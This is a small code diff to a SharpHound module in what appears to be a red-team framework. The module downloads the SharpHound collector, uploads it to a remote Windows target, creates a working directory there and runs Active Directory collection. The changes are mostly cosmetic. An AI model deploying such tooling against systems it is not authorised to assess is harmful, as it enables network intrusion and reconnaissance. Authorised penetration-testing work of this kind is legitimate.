@@ -122,7 +122,7 @@ class SharpHoundModule(KoiModule):
         collection = self.args.collection
         local_path = self.args.output or f"bloodhound_{time.strftime('%Y%m%d_%H%M%S')}.zip"
 
-        with self.spinner("Fetching latest SharpHound release info…"):
+        with self.spinner("Fetching latest SharpHound release info..."):
             try:
                 release = self._fetch_release()
             except Exception as exc:
@@ -138,7 +138,7 @@ class SharpHoundModule(KoiModule):
         asset_name, asset_url = match
         self.ok(f"Found {asset_name} ({version})")
 
-        with self.spinner(f"Downloading {asset_name}…"):
+        with self.spinner(f"Downloading {asset_name}..."):
             try:
                 zip_bytes = self._download_zip(asset_url)
                 files     = self._extract_payload(zip_bytes)
@@ -147,16 +147,16 @@ class SharpHoundModule(KoiModule):
                 return
 
         token  = uuid.uuid4().hex[:8]
-        work   = f"C:\\Windows\\Temp\\sh_{token}"
+        work   = f".\\sh_{token}"
         log_nm = "sharphound.log"
         exe_nm = next(n for n in files if n.lower() == "sharphound.exe")
 
-        with self.spinner("Preparing remote workspace…"):
+        with self.spinner("Preparing remote workspace..."):
             self._win_query(
                 f"New-Item -ItemType Directory -Path '{work}' -Force | Out-Null"
             )
 
-        with self.spinner(f"Uploading {len(files)} file(s) to target…"):
+        with self.spinner(f"Uploading {len(files)} file(s) to target..."):
             for name, blob in files.items():
                 dest = f"{work}\\{name}"
                 if not self._upload_bytes(blob, dest, timeout=120):
@@ -179,7 +179,7 @@ class SharpHoundModule(KoiModule):
             f"This can take several minutes."
         )
         try:
-            with self.spinner("Collecting and waiting for the zip…"):
+            with self.spinner("Collecting and waiting for the zip..."):
                 status, payload = self._run_and_collect(
                     work, exe_nm, log_nm, collection, timeout=1800.0
                 )
